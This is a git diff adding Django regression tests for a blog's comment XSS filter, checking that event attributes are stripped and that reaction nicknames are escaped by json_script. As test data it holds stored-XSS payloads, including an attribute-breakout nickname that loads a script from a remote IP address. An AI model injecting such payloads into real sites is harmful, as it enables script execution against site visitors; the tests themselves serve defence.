@@ -2,7 +2,7 @@
 Comments Views 测试
 测试评论功能的错误处理和边界条件
 """
-from django.test import TransactionTestCase
+from django.test import TransactionTestCase, SimpleTestCase
 from django.urls import reverse
 
 from comments.models import Comment
@@ -271,3 +271,75 @@ class CommentSecurityTest(TransactionTestCase, ViewTestMixin):
 
         # 验证表仍然存在
         self.assertTrue(Comment.objects.exists())
+
+
+class CommentXssFilterTest(SimpleTestCase):
+    """XSS 过滤器层回归测试（不依赖数据库）。
+
+    覆盖 issue #1030 的两个存储型 XSS 根因：
+    - 漏洞1：sanitize_html 必须清理事件属性（nh3 替换 bleach 后的回归）
+    - 漏洞2：reaction 数据经 json_script 输出必须转义（替换 to_json 后的回归）
+    """
+
+    def test_xss_event_attributes_stripped(self):
+        """漏洞1回归：评论正文中的事件属性（onfocus/onerror/onmouseover 等）必须被清理。
+
+        根因曾是 sanitize_html 的 class_filter 对非 class 属性 ``return value``，
+        导致 onfocus/autofocus 漏过白名单。改用 nh3 后属性白名单为集合形式，
+        div/img 等仅允许显式列出的属性，事件属性一律丢弃。
+        """
+        from blog.templatetags.blog_tags import comment_markdown
+        payloads = [
+            '<div autofocus onfocus=alert(document.domain)>x</div>',
+            '<img src=x onerror=alert(1)>',
+            '<div onmouseover=alert(1)>x</div>',
+        ]
+        for payload in payloads:
+            rendered = comment_markdown(payload)
+            for forbidden in ('onfocus', 'onerror', 'onmouseover', 'autofocus'):
+                self.assertNotIn(
+                    forbidden, rendered,
+                    f'事件属性 {forbidden} 未被清理，payload={payload!r}')
+
+    def test_reaction_nickname_xss_escaped(self):
+        """漏洞2回归：昵称含恶意脚本时，经 json_script 输出必须转义，
+        不得在 HTML 中产生攻击者注入的裸 ``<script>`` 标签。
+
+        根因曾是 to_json 用 ``mark_safe(json.dumps(...))`` 把含单引号的昵称
+        注入单引号包裹的 ``data-reactions`` 属性，属性被闭合后注入 ``<script>``。
+        改用 Django ``json_script`` 后，``< > & '`` 被转义为 \\uXXXX。
+        """
+        from django.utils.html import json_script
+        evil_nickname = '"\'><script src=//192.168.48.130:8081/x.js>'
+        data = {
+            '👍': {
+                'count': 1,
+                'has_reacted': False,
+                'users': [evil_nickname],
+            }
+        }
+        rendered = json_script(data, 'reactions-data-1')
+        # 不得出现攻击者注入的裸 <script src= 标签
+        self.assertNotIn('<script src=', rendered)
+        # json_script 会把 < 转义为 <，确保转义生效
+        self.assertIn('\\u003C', rendered)
+        # 数据未被损坏：解析 script 标签内容应能还原原值
+        import json as _json
+        body = rendered.split('>', 1)[1].rsplit('</script>', 1)[0]
+        self.assertEqual(_json.loads(body)['👍']['users'][0], evil_nickname)
+
+    def test_to_json_filter_removed(self):
+        """确认漏洞2的 sink to_json 过滤器已移除（改用 Django json_script）。"""
+        from blog.templatetags import blog_tags
+        self.assertFalse(
+            hasattr(blog_tags, 'to_json'),
+            'to_json 过滤器应已移除，改用 Django json_script')
+
+    def test_normal_markdown_preserved(self):
+        """正向回归：正常 Markdown（加粗、行内代码、代码块高亮）不应被 sanitize 误伤。"""
+        from blog.templatetags.blog_tags import comment_markdown
+        rendered = comment_markdown('Hello **world** and `code`')
+        self.assertIn('<strong>world</strong>', rendered)
+        self.assertIn('<code>code</code>', rendered)
+        # 缩进代码块经 codehilite 扩展生成高亮容器，class 应保留
+        self.assertIn('codehilite', comment_markdown('    print("hi")\n'))
